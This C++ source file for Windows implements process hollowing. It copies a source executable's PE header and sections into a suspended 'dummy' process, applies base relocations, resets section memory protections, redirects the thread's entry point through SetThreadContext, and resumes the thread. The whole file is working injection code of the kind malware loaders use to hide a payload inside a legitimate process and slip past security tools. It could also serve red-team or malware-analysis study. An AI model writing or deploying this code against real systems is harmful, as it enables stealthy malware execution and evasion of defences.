#include <windows.h>
#include <iostream>
#include "ntapi.h"

#include "globals.h"
#include "PInjection.h"
#include "PE.h"
#include "GetInfo.h"

// Inject Source PE Header into Destination
bool WritePEHeader(
    bool is64Bit,
    const NewPEInfo& srcPEInfo,
    PROCESS_INFORMATION& destProcessInfo,
    LPVOID destImageBase,
    SIZE_T DestImageSize,
    DWORD ulSrcImageSize,
    DWORD dwSrcHeaderSize,
    SIZE_T& dwBytesWritten)
{
    BOOL result = FALSE;

#if defined(_WIN64)
    // Allocate padded payload
    BYTE* padded_payload = (BYTE*)calloc(DestImageSize, 1);
    if (!padded_payload) 
    {
        fprintf(stderr, "Memory allocation failed for padded PE header\n");
        return false;
    }

    // Copy the PE image to the allocated buffer
    memcpy(padded_payload, srcPEInfo.pFileData.get(), ulSrcImageSize);

    // Write the padded image to the destination process
    result = WriteProcessMemory(destProcessInfo.hProcess,destImageBase,padded_payload,DestImageSize,&dwBytesWritten);
    free(padded_payload);
    return result;
#else
    result = WriteProcessMemory(destProcessInfo.hProcess,destImageBase,srcPEInfo.pFileData.get(),dwSrcHeaderSize,&dwBytesWritten);
	return result;
#endif
}


// Inject Source PE sections into Destination
bool WritePESections
(
    HANDLE hDestProcess,                // Handle to the destination process
    LPVOID destImageBase,               // Base address of the destination process' image
    const BYTE* pFileData,              // Pointer to the file data
    WORD numberOfSections,              // Number of sections in the source file
    IMAGE_DOS_HEADER* pDosHeader        // Pointer to the DOS header of the source file
) 
{
    for (WORD i = 0; i < numberOfSections; ++i) {
        // Calculate the offset to the current section header
        int iSectionOffset = pDosHeader->e_lfanew
            + sizeof(IMAGE_NT_HEADERS) + (sizeof(IMAGE_SECTION_HEADER) * i);

        // Get the current section header
        auto pSectionHeader = (IMAGE_SECTION_HEADER*)&pFileData[iSectionOffset];

        // Determine the destination section location in the target process memory
        LPVOID destSectionLocation = (LPVOID)((DWORD_PTR)destImageBase + pSectionHeader->VirtualAddress);

        // Determine the source section location in the source file data
        PVOID srcSectionLocation = (PVOID)&pFileData[pSectionHeader->PointerToRawData];

        // Write the current PE section from the source to the destination process memory
        if (!WriteProcessMemory(
            hDestProcess,
            destSectionLocation,
            srcSectionLocation,
            pSectionHeader->SizeOfRawData,
            NULL)) {
            // Log the error and return false if the write fails
            fprintf(stderr, "Could not write section to target process. ERROR: %d\n", GetLastError());
            return false;
        }
    }

    // Return true if all sections were written successfully
    return true;
}

// Restore relocations in the destination process
bool PatchRelocations(
    bool is64Bit,
    NewPEInfo& srcPEInfo,
    PROCESS_INFORMATION& destProcessInfo,
    LPVOID destImageBase,
    ULONGLONG deltaImageBase,
    WORD wSrcNumberOfSections,
    SIZE_T& bytesRead
)
{
    if (!srcPEInfo.pDosHeader || !srcPEInfo.pFileData || !srcPEInfo.pRelocationTable) {
        fprintf(stderr, "[Error] Invalid source PE info.\n");
        return false;
    }

    int iSectionOffset = srcPEInfo.pDosHeader->e_lfanew +
        (is64Bit ? sizeof(IMAGE_NT_HEADERS64) : sizeof(IMAGE_NT_HEADERS32));

    srcPEInfo.pSectionHeader = (IMAGE_SECTION_HEADER*)&(srcPEInfo.pFileData.get()[iSectionOffset]);
    auto srcImageSection = srcPEInfo.pSectionHeader;
    SIZE_T* fileBytesRead = 0;

    bool relocFound = false;

    for (WORD i = 0; i < wSrcNumberOfSections; ++i)
    {
        if (memcmp(srcImageSection->Name, ".reloc", 5) != 0)
        {
            srcImageSection++;
            continue;
        }

        relocFound = true;

        DWORD srcRelocationTableRaw = srcImageSection->PointerToRawData;
        DWORD relocationOffset = 0;

        while (relocationOffset < srcPEInfo.pRelocationTable->Size)
        {
            PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK) & (srcPEInfo.pFileData.get()[srcRelocationTableRaw + relocationOffset]);

            if (relocationBlock->BlockSize < sizeof(BASE_RELOCATION_BLOCK)) {
                fprintf(stderr, "[Error] Invalid relocation block size: %lu\n", relocationBlock->BlockSize);
                return false;
            }

            DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
            if (relocationEntryCount > 10000) {
                fprintf(stderr, "[Error] Suspicious relocation entry count: %lu\n", relocationEntryCount);
                return false;
            }

            PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY) & (srcPEInfo.pFileData.get()[srcRelocationTableRaw + relocationOffset + sizeof(BASE_RELOCATION_BLOCK)]);

            for (DWORD i = 0; i < relocationEntryCount; i++)
            {
                if ((is64Bit && relocationEntries[i].Type != IMAGE_REL_BASED_DIR64) ||
                    (!is64Bit && relocationEntries[i].Type != IMAGE_REL_BASED_HIGHLOW))
                {
                    continue;
                }

                ULONGLONG patchAddress = relocationBlock->PageAddress + relocationEntries[i].Offset;

                if (is64Bit)
                {
                    ULONGLONG patchedBuffer = 0;
                    if (!ReadProcessMemory(destProcessInfo.hProcess,
                        (LPCVOID)((ULONG_PTR)destImageBase + patchAddress),
                        &patchedBuffer, sizeof(ULONGLONG), &bytesRead))
                    {
                        fprintf(stderr, "[Error] ReadProcessMemory failed at address %p (64-bit). Error: %lu\n",
                            (PVOID)((ULONG_PTR)destImageBase + patchAddress), GetLastError());
                        return false;
                    }

                    patchedBuffer += deltaImageBase;

                    if (!WriteProcessMemory(destProcessInfo.hProcess,
                        (PVOID)((ULONG_PTR)destImageBase + patchAddress),
                        &patchedBuffer, sizeof(ULONGLONG), fileBytesRead))
                    {
                        fprintf(stderr, "[Error] WriteProcessMemory failed at address %p (64-bit). Error: %lu\n",
                            (PVOID)((ULONG_PTR)destImageBase + patchAddress), GetLastError());
                        return false;
                    }
                }
                else
                {
                    DWORD patchedBuffer32 = 0;
                    if (!ReadProcessMemory(destProcessInfo.hProcess,
                        (LPCVOID)((ULONG_PTR)destImageBase + patchAddress),
                        &patchedBuffer32, sizeof(DWORD), &bytesRead))
                    {
                        fprintf(stderr, "[Error] ReadProcessMemory failed at address %p (32-bit). Error: %lu\n",
                            (PVOID)((ULONG_PTR)destImageBase + patchAddress), GetLastError());
                        return false;
                    }

                    patchedBuffer32 += (DWORD)deltaImageBase;

                    if (!WriteProcessMemory(destProcessInfo.hProcess,
                        (PVOID)((ULONG_PTR)destImageBase + patchAddress),
                        &patchedBuffer32, sizeof(DWORD), fileBytesRead))
                    {
                        fprintf(stderr, "[Error] WriteProcessMemory failed at address %p (32-bit). Error: %lu\n",
                            (PVOID)((ULONG_PTR)destImageBase + patchAddress), GetLastError());
                        return false;
                    }
                }
            }

            relocationOffset += relocationBlock->BlockSize;
        }
    }

    if (!relocFound)
    {
        fprintf(stderr, "[Error] .reloc section not found.\n");
        return false;
    }

    return true;
}

// Function to patch section protections
bool PatchSectionProtections
(
    HANDLE hProcess,                    // Handle to the target process
    IMAGE_DOS_HEADER* pDosHeader,        // Pointer to the DOS header of the source file
    LPVOID destImageBase,               // Base address of the target process image
    const BYTE* pFileData,              // Pointer to the file data
    WORD numberOfSections,              // Number of sections in the PE file
    size_t imageSize                    // Size of the source image
)
{
    DWORD oldProtect = 0;
    int iSectionOffset = pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS);
    for (WORD i = 0; i < numberOfSections; ++i) {
        // Get the section header for the current section
        auto pSectionHeader = (IMAGE_SECTION_HEADER*)&(pFileData[iSectionOffset + (i * sizeof(IMAGE_SECTION_HEADER))]);
        
        // Determine section protection and offsets
        const DWORD sec_protect = get_sec_protection(pSectionHeader->Characteristics);
        const DWORD sec_offset = pSectionHeader->VirtualAddress;
        const DWORD sec_size = pSectionHeader->Misc.VirtualSize;
        const LPVOID section_va = (LPVOID)((ULONG_PTR)destImageBase + sec_offset);
        const DWORD protect_size = (DWORD)(imageSize - sec_offset);

        // Change the memory protection
        if (!VirtualProtectEx(hProcess, section_va, protect_size, sec_protect, &oldProtect)) {
            fprintf(stderr, "VirtualProtectEx failed for section %d. Error code: %lu\n", i, GetLastError());
            return false; // Return false on failure
        }
    }

    return true; // Return true if all protections were applied successfully
}

PROCESS_INFORMATION OverwriteProcess(NewPEInfo& srcPEInfo, PROCESS_INFORMATION destProcessInfo, PVOID& destImageBase, SIZE_T DestImageSize)
{
    SIZE_T ulSrcImageSize = is64Bit
        ? srcPEInfo.pNtHeaders64->OptionalHeader.SizeOfImage
        : srcPEInfo.pNtHeaders32->OptionalHeader.SizeOfImage;

    ULONGLONG dwSrcHeaderSize = is64Bit
        ? srcPEInfo.pNtHeaders64->OptionalHeader.SizeOfHeaders
        : srcPEInfo.pNtHeaders32->OptionalHeader.SizeOfHeaders;

    WORD wSrcNumberOfSections = is64Bit
        ? srcPEInfo.pNtHeaders64->FileHeader.NumberOfSections
        : srcPEInfo.pNtHeaders32->FileHeader.NumberOfSections;

    // GET DELTA BETWEEN STARTING ADDRESS OF DUMMY PROCESS AND STARTING ADDRESS OF SOURCE'S PREFERRED ADDRESS (For part 6)
    ULONGLONG deltaImageBase = (ULONG_PTR)destImageBase - (is64Bit
        ? srcPEInfo.pNtHeaders64->OptionalHeader.ImageBase
        : srcPEInfo.pNtHeaders32->OptionalHeader.ImageBase);

    SIZE_T bytesRead = NULL;
    SIZE_T dwBytesWritten = 0;
    DWORD oldProtect = 0; // Variable to store the old protection

	// CHANGE SOURCE'S IMAGE BASE TO DESTINATION'S IMAGE BASE
    if (is64Bit)
    {
        srcPEInfo.pNtHeaders64->OptionalHeader.ImageBase = (ULONG_PTR)destImageBase;
    }
    else
    {
        srcPEInfo.pNtHeaders32->OptionalHeader.ImageBase = (DWORD)destImageBase;
    }

    //1. CHANGE DESTINATION PROCESS REGION'S MEMORY PROTECTION TO RW
    if (!VirtualProtectEx(destProcessInfo.hProcess, destImageBase, DestImageSize, PAGE_READWRITE, &oldProtect))
    {
        fprintf(stderr, "VirtualProtectEx failed. Error code: %1u\n", GetLastError());
        exit(-1);
    }

    //2. WRITE THE PADDED PE HEADERS OF SOURCE PROCESS TO DESTINATION PROCESS' MEMORY LOCATION
	if (!WritePEHeader(is64Bit, srcPEInfo, destProcessInfo, destImageBase, DestImageSize, ulSrcImageSize, dwSrcHeaderSize, dwBytesWritten))
	{
		fprintf(stderr, "Failed to write source's PE header to dummy process.\n");
		exit(-1);
	}

    //3. WRITE PE SECTIONS OF SOURCE TO DESTINATION
   
    if (!WritePESections(destProcessInfo.hProcess,destImageBase,srcPEInfo.pFileData.get(),wSrcNumberOfSections,srcPEInfo.pDosHeader))
    {
        fprintf(stderr, "Failed to write PE sections to the target process.\n");
        exit(-1);
    }

    //4. APPLY RELOCATIONS PATCHING
    if (!PatchRelocations(is64Bit, srcPEInfo, destProcessInfo, destImageBase, deltaImageBase, wSrcNumberOfSections, bytesRead))
	{
		fprintf(stderr, "Failed to patch relocations.\n");
		exit(-1);
	}

    //5. PATCH SECTIONS PROTECTIONS
    if (!PatchSectionProtections(destProcessInfo.hProcess,srcPEInfo.pDosHeader,destImageBase,srcPEInfo.pFileData.get(),wSrcNumberOfSections,ulSrcImageSize))
    {
        fprintf(stderr, "Failed to patch section protections.\n");
        exit(-1);
    }

    return destProcessInfo;
}

void ResumeDestProcess(const NewPEInfo& srcPEInfo, const PROCESS_INFORMATION& destProcessInfo, PVOID destImageBase)
{
    CONTEXT ctx = { 0 };
    memset(&ctx, 0, sizeof(CONTEXT));
    ctx.ContextFlags = CONTEXT_INTEGER;
    // GET TARGET'S THREAD CONTEXT, DUH
    BOOL bRet = BOOLIFY(GetThreadContext(destProcessInfo.hThread, &ctx));
    if (!bRet)
    {
        fprintf(stderr, "Could not get thread context. ERROR: %X\n", GetLastError());
        exit(-1);
    }

    // GET OFFSET TO SOURCE PROCESS' ENTRY POINT

    DWORD offsetEP = is64Bit ? srcPEInfo.pNtHeaders64->OptionalHeader.AddressOfEntryPoint : srcPEInfo.pNtHeaders32->OptionalHeader.AddressOfEntryPoint;

    // CHANGE CTX EAX TO POINT TO NEW ENTRY POINT
#if defined(_WIN64)
    ctx.Rcx = (ULONGLONG)destImageBase + (DWORD)offsetEP;
#else
    ctx.Eax = (DWORD)destImageBase + (DWORD)offsetEP;
#endif
    //ULONGLONG ep_va = (ULONGLONG)destImageBase + (DWORD)offsetEP;
    //ctx.Rcx = ep_va;
    // SET TARGET'S THREAD CONTEXT WITH NEW ENTRY POINT (EIP)
    bRet = BOOLIFY(SetThreadContext(destProcessInfo.hThread, &ctx));
    // CHECK IF SUCCESSFULLY SET NEW THREAD CONTEXT
    if (!bRet)
    {
        fprintf(stderr, "Could not set thread context. ERROR: %X\n", GetLastError());
        exit(-1);
    }

    // RESUME THE TARGET PROCESS & VOILA
    auto ThreadResult = ResumeThread(destProcessInfo.hThread);

    // UNLESS IT FAILED THEN BOO :(
    if (ThreadResult == -1)
    {
        fprintf(stderr, "ResumeThread Fail. ERROR: %d\n", GetLastError());
    }

    // Close handles
    CloseHandle(destProcessInfo.hThread);
    CloseHandle(destProcessInfo.hProcess);
}
